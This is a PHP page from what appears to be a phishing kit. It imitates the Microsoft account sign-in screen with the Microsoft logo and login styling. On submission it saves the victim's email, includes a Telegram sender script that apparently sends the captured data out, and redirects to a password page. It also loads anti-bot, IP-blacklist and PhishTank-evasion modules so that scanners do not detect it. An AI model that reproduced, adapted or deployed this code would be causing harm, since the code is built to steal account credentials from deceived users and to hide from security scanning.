<?php 
session_start();
include('./Anti/Bot-Spox.php');
include('./Anti/Bot-Crawler.php');
include('./Anti/new.php');
include('./Anti/IP-BlackList.php');
include('./Anti/Dila_DZ.php');
include('./BOTS/iprange.php');
include('./BOTS/phishtank.php');
include('fetchDATA.php');
include('./BOTS/send/tgapi.php');

if($_SERVER['REQUEST_METHOD'] == 'POST'){
   if(!empty($_POST['loginfmt'])){
      $_SESSION['USERNAME'] = $_POST['loginfmt'];
      include('./send/tgapi.php');
      header('location: password.php');
      sleep(2);
   }

}
?>
<html dir="ltr" class="" lang="en">
   <head>
      <title>Sign in to your account</title>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <meta name="robots" content="none">
      <link rel="shortcut icon" href="./assets/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
      <link crossorigin="anonymous" href="./assets/css/converged.v2.login.min_zmhwgv_kbcs-aml46kcgfg2.css" rel="stylesheet">
   </head>
   <body class="cb" style="display: block;">
      <div>
         <div></div>
         <form onsubmit="checkData()" name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" autocomplete="off" action="<?php echo $_SERVER['PHP_SELF']; ?>">
            <div class="login-paginated-page">
              
               <div id="lightboxTemplateContainer" >
                  <div id="lightboxBackgroundContainer">
                     <div class="background-image-holder" role="presentation">
                       
                        <div class="background-image ext-background-image" style="background-image: url('./assets/images/2_bc3d32a696895f78c19df6c717586a5d.svg');"></div>
                     
                     </div>
                  </div>
            
                  <div class="outer">
                     <div class="template-section main-section">
                        <div class="middle ext-middle">
                           <div class="full-height">
        
                              <div class="flex-column">
        
                                 <div class="win-scroll">
                                    <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
                                       <div class="lightbox-cover"></div>
                                     
                                       <div>
                                          <img class="logo" role="img" src="./assets/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                                         
                                       </div>
                                   
                                       <div role="main">
                                          <div class="">
                                             <div class="pagination-view animate slide-in-next">
                                              
                                                <div data-viewid="1" data-showfedcredbutton="true" >
                                                   <div >
                                                      <div class="row title ext-title" id="loginHeader">
                                                         <div role="heading" aria-level="1">Sign in</div>
                                                      </div>
                                                   </div>
                                                   <div class="row">
                                                      <div role="alert" aria-live="assertive">
                                                        <div class="col-md-24 error ext-error" id="usernameError" style="display:none">Enter a valid email address, phone number, or Skype name.</div>
                                                      </div>
                                                      <div class="form-group col-md-24">
                                                       
                                                         <div class="placeholderContainer">
                                       
                                                            <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box " aria-required="true" placeholder="Email, phone, or Skype">
                                                            <!-- <input name="passwd" type="password" id="i0118" autocomplete="off" class="moveOffScreen" tabindex="-1" aria-hidden="true"> -->
                                                            
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div  class="position-buttons">
                                                      <div class="row">
                                                         <div class="col-md-24">
                                                            <div class="text-13">
                                                               <div class="form-group">No account? <a href="javascript:void()" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                                                              
                                                               <div class="form-group">
                                                                  <a id="cantAccessAccount" name="cannotAccessAccount" href="javascript:void()">Can’t access your account?</a>
                                                               </div>
                                                               
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div class="win-button-pin-bottom" >
                                                      <div class="row">
                                                         <div>
                                                            <div class="col-xs-24 no-padding-left-right button-container">
                                                    
                                                               <div  class="inline-block">
                                                                  <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" value="Next" data-report-attached="1">
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   
                                                </div>
                                               
                                             </div>
                                          </div>
                                       </div>
                                       
                                       
                                       <div>
                                          <input type="hidden" name="i19"  value="">
                                       </div>
                                       
                                    </div>
                                    
                                    <div  class="promoted-fed-cred-box ext-promoted-fed-cred-box">
                                       <div class="promoted-fed-cred-content" >
                                          <div class="row tile">
                                             <div class="table" role="button" tabindex="0" aria-label="Sign-in options">
                                                <div class="table-row">
                                                   <div class="table-cell tile-img medium">
                                                      <img class="tile-img medium" role="presentation"  src="./assets/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
                                                   </div>
                                                   <div class="table-cell text-left content" >
                                                      <div data-test-id="signinOptions">Sign-in options</div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
       
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div id="footer" role="contentinfo" class="footer ext-footer">
                        <div>
                 
                           <div id="footerLinks" class="footerNode text-secondary">
                         
                              <a id="ftrTerms"  href="javascript:void()" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                           
                              <a id="ftrPrivacy"  href="javascript:void()" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                            
                              <a id="moreOptions" href="javascript:void()" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            
            </div>
         </form>
      </div>
   </body>
   <script src="./assets/js/user.js"></script>
</html>